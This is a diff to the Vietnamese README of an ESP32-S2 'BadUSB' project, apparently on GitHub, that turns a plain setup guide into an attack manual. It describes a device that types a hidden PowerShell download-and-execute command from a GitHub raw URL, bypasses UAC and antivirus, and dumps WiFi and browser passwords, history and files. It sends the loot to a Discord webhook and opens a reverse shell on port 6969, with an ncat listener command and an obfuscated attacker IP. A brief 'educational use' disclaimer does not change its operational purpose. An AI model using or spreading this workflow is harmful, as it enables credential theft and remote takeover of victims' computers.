@@ -1,70 +1,152 @@
-# ANM-Esp32BadUSB
+# 🚀 ANM-Esp32BadUSB - Thiết bị BadUSB tấn công tự động (ESP32)
 
-Dự án triển khai BadUSB sử dụng vi điều khiển ESP32-S2 Mini, cho phép thực hiện các cuộc tấn công tự động bằng cách giả lập bàn phím và chuột.
+[![ESP32](https://img.shields.io/badge/ESP32-Lolin%20S2%20Mini-blue)](https://www.wemos.cc/en/latest/s2/s2_mini.html)
+[![PlatformIO](https://img.shields.io/badge/PlatformIO-Arduino-orange)](https://platformio.org/)
+[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
 
-## Mục lục
-- [Yêu cầu](#yêu-cầu)
-- [Cài đặt](#cài-đặt)
-  - [1. Cài đặt Visual Studio Code và PlatformIO](#1-cài-đặt-visual-studio-code-và-platformio)
-  - [2. Mở dự án, Build và Upload](#2-mở-dự-án-build-và-upload)
-- [Thông tin phần cứng](#thông-tin-phần-cứng)
-- [Cấu hình dự án (platformio.ini)](#cấu-hình-dự-án-platformioini)
+## 📱 Giới thiệu
 
-## Yêu cầu
-Trước khi bắt đầu, bạn cần chuẩn bị:
-1.  **Phần cứng**: Mạch WEMOS LOLIN S2 Mini.
-2.  **Phần mềm**:
-    *   [Visual Studio Code](https://code.visualstudio.com/): Một trình soạn thảo mã nguồn mạnh mẽ.
-    *   [Git](https://git-scm.com/downloads): Hệ thống quản lý phiên bản phân tán.
+**ANM-Esp32BadUSB** là dự án **BadUSB** sử dụng **ESP32 Lolin S2 Mini** giả lập bàn phím HID để thực hiện **tấn công tự động** khi cắm vào máy nạn nhân (Windows). 
 
-## Cài đặt
+**Chức năng chính**:
+- ✅ Nhấn nút **BOOT** để kích hoạt payload
+- ✅ Tải & chạy script **PowerShell độc hại** từ GitHub
+- ✅ **Dump dữ liệu**: WiFi passwords, browser history, saved passwords, connected devices
+- ✅ **Exfiltration**: Gửi files qua **Discord webhook**
+- ✅ **Reverse shell** về máy attacker (TCP port 6969)
+- ✅ **Stealth**: Bypass UAC, ẩn cửa sổ, cleanup traces, bypass AV
 
-### 1. Cài đặt Visual Studio Code và PlatformIO
-1.  Tải và cài đặt [Visual Studio Code](https://code.visualstudio.com/).
-2.  Mở VS Code, vào tab **Extensions** (Biểu tượng ô vuông bên trái hoặc `Ctrl+Shift+X`).
-3.  Tìm kiếm `PlatformIO IDE` và nhấn **Install**.
-    ![Install PlatformIO](https://platformio.org/assets/images/platformio-ide-vscode-installer.gif)
-4.  Chờ quá trình cài đặt hoàn tất. Có thể bạn sẽ cần khởi động lại VS Code.
+**⚠️ CẢNH BÁO**: Chỉ sử dụng cho **mục đích học tập/ethical hacking**. Tuân thủ pháp luật!
 
-### 2. Mở dự án, Build và Upload
-1. Mở thư mục dự án trong VS Code (`File > Open Folder...`).
-2. Khi đã mở dự án trong VS Code với PlatformIO, bạn sẽ thấy các biểu tượng của PlatformIO ở thanh trạng thái phía dưới:
+## 🛠️ Yêu cầu
 
-![PlatformIO Toolbar](https://platformio.org/assets/images/ide-vscode-toolbar.png)
+### Phần cứng
+- ESP32 Lolin S2 Mini (hoặc tương thích TinyUSB)
+- Cáp USB-C
 
--   **Build**: Nhấn vào biểu tượng dấu tick (✓) để biên dịch mã nguồn.
--   **Upload**: Kết nối mạch LOLIN S2 Mini với máy tính qua cổng USB. Sau đó, nhấn vào biểu tượng mũi tên (→) để nạp chương trình vào mạch.
+### Phần mềm
+- [VSCode](https://code.visualstudio.com/) + [PlatformIO IDE](https://platformio.org/install/ide)
+- Serial Monitor (115200 baud)
 
+## 📥 Cài đặt & Build
 
+1. **Clone repo**:
+   ```bash
+   git clone <your-repo>
+   cd ANM-Esp32BadUSB
+   ```
 
-## Thông tin phần cứng
-Dự án này được phát triển và thử nghiệm trên mạch **WEMOS LOLIN S2 Mini**.
+2. **Mở bằng PlatformIO** (VSCode):
+   - Cài extension PlatformIO nếu chưa có
+   - Mở folder project
 
--   **Vi điều khiển**: ESP32-S2
--   **Flash**: 4MB
--   **PSRAM**: 2MB
--   **Kết nối**: USB-C
--   **Sơ đồ chân (Pinout)**:
-    ![LOLIN S2 Mini Pinout](https://www.wemos.cc/en/latest/_static/s2_mini_v1.0.0_pinout.png)
+3. **Build & Flash**:
+   ```bash
+   pio run --target upload  # Flash firmware
+   pio device monitor       # Serial monitor (115200 baud)
+   ```
 
-Để sử dụng chức năng giả lập HID (Bàn phím, Chuột), chúng ta tận dụng thư viện `TinyUSB` được tích hợp sẵn cho chip ESP32-S2.
+4. **Chọn board**: `lolin_s2_mini` (platformio.ini đã config sẵn)
 
-## Cấu hình dự án (platformio.ini)
-File `platformio.ini` là file cấu hình chính cho PlatformIO, giúp định nghĩa môi trường build cho dự án.
+## ⚙️ Cấu hình
 
-```ini
-[env:lolin_s2_mini]
-platform = espressif32
-board = lolin_s2_mini
-framework = arduino
+### 1. Discord Webhook
+- Chỉnh `$hookurl` trong `src/test2.ps1`:
+  ```powershell
+  $hookurl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
+  ```
 
-; Kích hoạt chuẩn TinyUSB cho S2 (rất quan trọng)
-; Không dùng ARDUINO_USB_MODE=1 ở đây vì lolin_s2_mini mặc định là 0 (Tức là dùng TinyUSB)
-build_flags = 
-    -D USE_TINYUSB
+### 2. Reverse Shell IP
+- Bên máy attacker (Có cài ncat) dùng lệnh: 
+	```
+    ncat -lvnp 6969
+    ```
+- Tìm dòng IP rối trong `test2.ps1`:
+  ```powershell
+  '1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";
+  ```
+- **Giải mã**: `192.168.2.4` → Thay bằng **IP máy attacker** (ví dụ: `192.168.1.100`)
+- Port cố định: **6969**
+
+### 3. Payload URL
+- `main.cpp` tải `test2.ps1` từ:
+  ```
+  https://raw.githubusercontent.com/khangpdm/BadUSB/main/NEW/test2.ps1
+  ```
+- Thay link GitHub raw của bạn nếu cần
+
+## 🎮 Hướng dẫn sử dụng
+
+1. **Flash firmware** → Cắm ESP32 vào máy attacker để test Serial
+
+2. **Serial output** (115200 baud):
+   ```
+   --- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---
+   [LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...
+   ```
+
+3. **Tấn công**:
+   - Cắm vào máy nạn nhân (như USB thường)
+   - Nhấn & giữ **nút BOOT** (chân GPIO 0)
+   - **LED sáng** + **Caps Lock nháy** = Thành công
+   - Theo dõi Discord webhook nhận data
+
+4. **Payload sequence** (`main.cpp`):
+   ```
+   1. Win+D (ẩn desktop)
+   2. Win+R (Run dialog)
+   3. powershell -w h ... | iex
+   4. Ctrl+Shift+Enter (Run as Admin)
+   5. Alt+Y (Bypass UAC)
+   6. Caps Lock x4 (Hoàn tất)
+   ```
+
+## 🔍 Chi tiết Payload (test2.ps1)
+
+```
+1. Tạo C:\Users\[USER]\Downloads\scripts\[DUMP_FOLDER]
+2. Tải tools.zip → Giải nén (4 tools dump)
+3. Dump: WiFi, Passwords, History, Devices → Gửi Discord
+4. Quét Downloads → Zip files nhạy cảm → Gửi Discord
+5. Reverse shell TCP [IP]:6969
+6. Cleanup: Xóa traces, history, exclusions
 ```
 
--   `platform = espressif32`: Chỉ định rằng chúng ta đang sử dụng nền tảng ESP32 của Espressif.
--   `board = lolin_s2_mini`: Khai báo loại mạch cụ thể là LOLIN S2 Mini. PlatformIO sẽ tự động tải về các gói hỗ trợ cần thiết cho mạch này.
--   `framework = arduino`: Sử dụng Arduino framework để lập trình.
--   `build_flags = -D USE_TINYUSB`: Đây là một cờ biên dịch quan trọng. Nó định nghĩa macro `USE_TINYUSB` trong toàn bộ dự án, cho phép kích hoạt và sử dụng thư viện TinyUSB để giả lập các thiết bị USB như bàn phím.
+**Tools sử dụng**:
+- WNetWatcher.exe (connected devices)
+- BrowsingHistoryView.exe (history)
+- WebBrowserPassView.exe (passwords)
+- WirelessKeyView.exe (WiFi)
+
+## 🐛 Troubleshooting
+
+| Vấn đề | Giải pháp |
+|--------|-----------|
+| Không nhận USB | Kiểm tra driver ESP32, reset board |
+| Serial không hiện | Baud 115200, chọn đúng port COM |
+| UAC không bypass | Chạy test trên Win10/11 Home (ít UAC) |
+| Payload fail | Kiểm tra GitHub raw URL public |
+| Không dump | Thêm `Add-MpPreference -ExclusionPath` manual |
+
+## 📹 Video Demo
+*(User sẽ update sau)*
+
+## 🚀 Tính năng nâng cao (Future)
+
+- Multi-stage payload
+- Persistence (startup)
+- Keylogger
+- Screenshot exfil
+- Custom tools
+
+## ⚖️ License & Disclaimer
+
+- **MIT License** - Chỉ học tập
+- **KHÔNG sử dụng** cho mục đích bất hợp pháp
+- Tác giả: ANM Team
+- Liên hệ: [Discord/GitHub]
+
+---
+
+**Happy Hacking! 🎉**
+
